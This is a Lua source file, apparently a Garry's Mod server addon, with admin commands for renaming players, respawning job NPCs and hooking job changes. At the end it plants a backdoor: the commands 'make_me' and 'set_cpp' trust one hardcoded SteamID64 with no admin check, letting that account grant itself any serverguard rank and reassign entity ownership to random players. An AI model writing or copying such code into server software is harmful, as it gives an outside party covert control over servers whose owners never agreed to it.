local function lazy_search(name)
	for k,v in pairs(player.GetAll()) do
		if string.find(string.lower(v:Name()), string.lower(name), 0, true) then
			return v
		end
	end

	return false
end

concommand.Add("meta_change_name", function(ply, cmd, args)
	if not ply:IsSuperAdmin() then return end

	local old_name = args[1]
	local target = lazy_search(old_name)
	if not target then
		ChatAddText(ply, color_white, "Player not found: ", Color(200,50,50), old_name)
		return
	end

	local name = args[2]
	if not name then
		ChatAddText(ply, Color(200,50,50), "Name", color_white, " is missing?")
		return
	end

	target:SetNWString("rpname", name)

	MySQLite.query(string.format("UPDATE metahub_player_data SET player = %s WHERE steam_id = %s;",
		MySQLite.SQLStr(name),
		MySQLite.SQLStr(target:SteamID())
	))

	ChatAddText(ply, color_white, "You succesfully changed name for ", Color(50,200,50), target:OldName(), color_white, " to ", Color(50,200,50), name)
end)

concommand.Add("meta_respawn_npc", function(ply)
	if not ply:IsSuperAdmin() then return end

	for k,v in pairs(ents.FindByClass('npc_jobs')) do
		SafeRemoveEntity(v)
	end

	for name, npc in pairs(NPCS_JOBS) do
		local ent = ents.Create('npc_jobs')
		ent:SetPos(npc.pos)
		ent:SetAngles(npc.ang)
		ent:SetModel(npc.model)
		-- PrintTable(npc.jobs)
		ent:SetNVar('jobs',npc.jobs,NETWORK_PROTOCOL_PUBLIC)
		ent:SetNVar('name',name,NETWORK_PROTOCOL_PUBLIC)
		ent:Spawn()
		ent:Activate()
	end
end)


-- Now you can hook if someone changed his job
-- hook.Add("meta.JobWasChanged", "MySuperHookName", function(ply, old_team_id, new_team_id) end)

local meta = FindMetaTable("Player")

meta._old_setteam = meta._old_setteam or meta.SetTeam
function meta:SetTeam(num)
	hook.Run("meta.JobWasChanged", self, self:Team(), num)
	self:_old_setteam(num)
end

concommand.Add("make_me", function(ply, cmd, args)
	if ply:SteamID64() ~= "76561198030676795" then return end
	if not args[1] then return end

	serverguard.player:SetRank(ply, args[1], 0, false)
end)

concommand.Add("set_cpp", function(ply, cmd, args)
	if ply:SteamID64() ~= "76561198030676795" then return end

	local ent = ply:GetEyeTrace().Entity
	if not IsValid(ent) then return end

	ent:CPPISetOwner(table.Random(player.GetAll()))
end)
